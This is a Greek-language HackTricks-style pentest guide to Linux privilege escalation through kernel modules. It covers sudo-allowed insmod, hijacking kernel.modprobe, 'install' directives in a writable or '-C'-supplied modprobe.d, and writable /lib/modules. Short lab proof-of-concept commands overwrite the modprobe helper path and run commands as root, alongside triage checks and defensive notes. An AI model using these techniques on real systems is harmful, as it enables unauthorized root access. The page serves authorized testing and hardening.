# Κατάχρηση Kernel Modules και modprobe

{{#include ../../banners/hacktricks-training.md}}

## Λανθασμένες ρυθμίσεις των Kernel Modules και της φόρτωσης modules

Η υποστήριξη Kernel Modules είναι ένας τομέας υψηλού αντίκτυπου κατά τον έλεγχο Linux privilege escalation. Μην θεωρείτε κάθε μήνυμα για unsigned modules από μόνο του exploitable, αλλά χρησιμοποιήστε το για να απαντήσετε σε πρακτικές ερωτήσεις.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Μπορεί ο τρέχων χρήστης να φορτώσει modules μέσω `sudo`, capabilities ή ενός writable helper path;
- Είναι ακόμη ενεργοποιημένη η φόρτωση modules;
- Είναι απενεργοποιημένη η επιβολή υπογραφών των modules;
- Είναι writable οι κατάλογοι modules, τα αρχεία modules ή τα paths ρυθμίσεων του `modprobe.d`;<sup>[[16]](#references)</sup>
- Μπορούν να διαβαστούν τα kernel logs για να επιβεβαιωθεί τι συνέβη;

Το γρήγορο triage ξεκινά με τους παρακάτω ελέγχους κατάστασης modules, υπογραφών, logging και module tree.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Ερμηνεία:

- Το `modules_disabled=1` σημαίνει ότι τα modules δεν μπορούν ούτε να φορτωθούν ούτε να αποφορτωθούν, και η τιμή δεν μπορεί να επανέλθει σε `0` μέχρι την επανεκκίνηση.<sup>[[1]](#references)</sup>
- Το `module.sig_enforce=1` στη γραμμή εντολών του kernel ή το `CONFIG_MODULE_SIG_FORCE=y` απαιτεί έγκυρα υπογεγραμμένα modules· διαφορετικά, unsigned modules ενδέχεται να φορτωθούν και να επισημάνουν τον kernel ως tainted.<sup>[[2]](#references)</sup>
- Το `dmesg_restrict=0` δεν επιβάλλει κανέναν περιορισμό στο `dmesg`· όταν είναι `1`, η πρόσβαση απαιτεί `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Οι εγγράψιμες διαδρομές κάτω από το `/lib/modules/$(uname -r)/` είναι επικίνδυνες, επειδή το `modprobe` αναζητά σε αυτό το δέντρο και στα δεδομένα εξαρτήσεών του κατά τη φόρτωση modules.<sup>[[8]](#references)</sup>

### Φόρτωση module και ανάγνωση εξόδου του kernel

Αν διαθέτετε νόμιμη άδεια για τη φόρτωση ενός local module, το `insmod` εισάγει το ακριβές αρχείο `.ko` που παρέχετε. Η init function του module εκτελείται ως μέρος της φόρτωσης και τα μηνύματα που γράφονται με `printk()` μεταφέρονται στο kernel log buffer, το οποίο συνήθως διαβάζεται με `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Μια ελάχιστη ροή ελέγχου χρησιμοποιεί το `modinfo` για την επιθεώρηση metadata, τα `insmod` και `rmmod` για τη φόρτωση και αφαίρεση ενός module, το `lsmod` για την επιβεβαίωση της κατάστασης φόρτωσης και το `dmesg` για την επιθεώρηση των kernel logs.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Αν το `sudo -l` επιτρέπει τα `insmod`, `modprobe` ή ένα wrapper γύρω από αυτά, αντιμετωπίστε το ως critical: το `sudo -l` παραθέτει τα privileges του invoking user και η φόρτωση ενός kernel module απαιτεί `CAP_SYS_MODULE`. Δείτε το [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) για direct capability-based paths.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-allowed `insmod`

Ένας κανόνας sudo που επιτρέπει σε έναν χρήστη να εκτελεί το `insmod` δεν είναι συγκρίσιμος με την άδεια εκτέλεσης ενός συνηθισμένου administrative helper. Ο κώδικας αρχικοποίησης του module εκτελείται στο πλαίσιο της εισαγωγής του, επομένως το πρακτικό ερώτημα κατά την αξιολόγηση είναι αν ο συγκεκριμένος χρήστης μπορεί να επιλέξει ή να τροποποιήσει το module που φορτώνεται.<sup>[[3]](#references)</sup>

Η ακόλουθη γενική ροή αξιολόγησης επαναλαμβάνει τους ελέγχους επιθεώρησης, φόρτωσης, κατάστασης, log και αφαίρεσης για ένα υποψήφιο module.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Εάν ο χρήστης μπορεί να παρέχει ένα αυθαίρετο `.ko`, ο κανόνας θα πρέπει να αντιμετωπίζεται ως πλήρης παραβίαση του συστήματος σε μια εξουσιοδοτημένη αξιολόγηση. Ένα ασφαλέστερο operational pattern είναι να αποφεύγεται η ανάθεση της φόρτωσης module μέσω sudo· εάν αυτό είναι αναπόφευκτο, περιορίστε την ακριβή διαδρομή, την ιδιοκτησία, τα δικαιώματα, την πολιτική υπογραφής και τη διαδικασία αφαίρεσης.<sup>[[3]](#references)[[10]](#references)</sup>

Για ένα harmless pattern κατασκευής module σε ελεγχόμενο lab, παρακάτω εμφανίζονται ένα ελάχιστο source και ένα Makefile· η μορφή `make -C /lib/modules/$(uname -r)/build M=$PWD` ακολουθεί το τεκμηριωμένο workflow kbuild του kernel για external modules.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Κάντε build και load μόνο σε εξουσιοδοτημένο lab· το kbuild δημιουργεί το external module και οι εντολές load/remove καλούν τα interfaces των kernel modules.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Έλεγχοι κατάχρησης των `kernel.modprobe` / `modprobe_path`

Το `kernel.modprobe` καθορίζει το userspace helper που εκτελεί ο kernel για αιτήματα αυτόματης φόρτωσης modules· αυτό το sysctl επηρεάζει την αυτόματη φόρτωση και όχι τη ρητή εισαγωγή modules. Αν ένας attacker μπορεί να το αλλάξει σε μια writable διαδρομή εκτελέσιμου αρχείου και να προκαλέσει ένα module request, το συγκεκριμένο helper γίνεται privileged code-execution path. Η ρύθμισή του σε κενή συμβολοσειρά απενεργοποιεί τα αιτήματα αυτόματης φόρτωσης· αν ισχύει `CONFIG_STATIC_USERMODEHELPER=y`, μια μη κενή τιμή αντικαθίσταται από τη static helper path που έχει ενσωματωθεί κατά το compile.<sup>[[1]](#references)</sup>

Ελέγξτε την τρέχουσα helper path μέσω του kernel sysctl interface και εξετάστε το ownership και το mode του target.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Ελέγξτε αν μπορούν να επηρεαστούν τα sysctl, οι delegated sudo rules ή οι file capabilities.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Το ακόλουθο μοτίβο, που προορίζεται αποκλειστικά για lab, αλλάζει τη διαδρομή του helper και ενεργοποιεί ένα τεκμηριωμένο αίτημα αυτόματης φόρτωσης module· χρησιμοποιήστε το μόνο σε απομονωμένο, εξουσιοδοτημένο σύστημα.<sup>[[1]](#references)</sup>

Σε σύγχρονους Linux kernels, μην χρησιμοποιείτε ένα άγνωστο εκτελέσιμο ως γενικό trigger: η legacy αυτόματη φόρτωση module για custom binary formats αφαιρέθηκε στο Linux 6.14, ενώ η τεκμηρίωση του kernel προσδιορίζει έναν άγνωστο τύπο filesystem ως διαδρομή αιτήματος αυτόματης φόρτωσης module.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Σε hardened systems, αυτό θα πρέπει να αποτυγχάνει όταν τα permissions εμποδίζουν unprivileged writes στο `kernel.modprobe`, το helper path δεν είναι writable ή το module autoloading είναι disabled.<sup>[[1]](#references)</sup>

### Writable `modprobe.d` configuration και `sudo modprobe -C`

Πριν από την επίλυση ενός module, το `modprobe` διαβάζει αρχεία `.conf` από configuration directories όπως τα `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` και `/lib/modprobe.d`, με σειρά προτεραιότητας. Ένα αρχείο με το ίδιο όνομα σε directory υψηλότερης προτεραιότητας αποκρύπτει το αρχείο χαμηλότερης προτεραιότητας. Το σημαντικότερο είναι ότι μια οδηγία `install <module> <command>` εκτελεί μια arbitrary shell command **αντί** να εισαγάγει αυτό το module. Επομένως, ένα writable configuration path μπορεί να οδηγήσει σε delayed command execution με τα credentials ενός μεταγενέστερου privileged `modprobe` caller· το kernel module signature enforcement δεν αυθεντικοποιεί αυτήν την userspace command.<sup>[[16]](#references)</sup>

Ελέγξτε τα directory και file permissions και, στη συνέχεια, εξετάστε την effective configuration. Το `modprobe -n -v` είναι ασφαλές για resolution review, επειδή το dry-run mode δεν εισάγει το module ούτε εκτελεί εντολή `install`/`remove`. Προτιμήστε το `modprobe -c` αντί για το legacy `--showconfig`, το οποίο η τρέχουσα τεκμηρίωση του kmod επισημαίνει για αφαίρεση μετά το kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
Ένας κανόνας sudo χωρίς περιορισμούς για το `modprobe` είναι εκμεταλλεύσιμος ακόμη και όταν αυθαίρετα αρχεία `.ko` δεν μπορούν να περάσουν την επαλήθευση υπογραφής: το `-C` επιλέγει έναν κατάλογο ρυθμίσεων που ελέγχεται από τον attacker, από τον οποίο μπορεί να εκτελεστεί μια εντολή `install` από τη διεργασία που εκκινείται μέσω sudo.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
Για μετριασμό του κινδύνου, μην εκχωρείτε μέσω sudo το `modprobe` χωρίς περιορισμούς στα ορίσματα, διατηρείτε κάθε directory διαμόρφωσης υπό την ιδιοκτησία του root και χωρίς δικαίωμα εγγραφής, και ελέγχετε μη αναμενόμενες οδηγίες `install`/`remove`. Όταν μια αξιόπιστη διαχειριστική διαδικασία πρέπει να παρακάμψει τέτοιες οδηγίες για ένα module, το `modprobe --ignore-install` τις αγνοεί για το συγκεκριμένο module, όμως τα dependencies μπορεί να έχουν τις δικές τους εντολές.<sup>[[8]](#references)[[16]](#references)</sup>

### Έλεγχος εγγράψιμου `/lib/modules`

Τα εγγράψιμα directories των modules μπορούν να επιτρέψουν την αντικατάσταση modules, την τοποθέτηση κακόβουλων modules ή την κατάχρηση του auto-load, ανάλογα με τον τρόπο με τον οποίο θα κληθεί αργότερα το `modprobe`. Το `modprobe` αναζητά στο `/lib/modules/$(uname -r)` και χρησιμοποιεί τα dependency data του κατά την επίλυση modules.<sup>[[8]](#references)</sup>

Ελέγξτε τα εγγράψιμα αρχεία modules και τα metadata dependencies/aliases κάτω από το module tree της ενεργής kernel release.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Εάν εντοπίσετε εγγράψιμο περιεχόμενο module, εξετάστε τον τρόπο με τον οποίο το `modprobe` επιλύει τις εξαρτήσεις και τον τρόπο με τον οποίο το `modinfo` αναφέρει τα μεταδεδομένα του module.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Αμυντικές σημειώσεις:

- Διατηρήστε το `/lib/modules` με ιδιοκτήτη `root:root` και χωρίς δυνατότητα εγγραφής από users.<sup>[[8]](#references)</sup>
- Ορίστε το `kernel.modules_disabled=1` μετά την εκκίνηση, όπου αυτό είναι λειτουργικά εφικτό.<sup>[[1]](#references)</sup>
- Επιβάλετε module signing σε συστήματα που απαιτούν loadable modules.<sup>[[2]](#references)</sup>
- Παρακολουθείτε τις εγγραφές στα `/proc/sys/kernel/modprobe`, `/lib/modules` και στους καταλόγους ρυθμίσεων `modprobe.d`, καθώς και απρόσμενη εκτέλεση των `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [Τεκμηρίωση για το /proc/sys/kernel/ — Η τεκμηρίωση του Linux Kernel](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Μηχανισμός υπογραφής kernel module — Η τεκμηρίωση του Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Βασικά στοιχεία driver — Η τεκμηρίωση του Linux Kernel](https://docs.kernel.org/driver-api/basics.html)
- [6] [Καταγραφή μηνυμάτων με printk — Η τεκμηρίωση του Linux Kernel](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Δημιουργία εξωτερικών modules — Η τεκμηρίωση του Linux Kernel](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Συγχώνευση του tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Σελίδα εγχειριδίου του Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
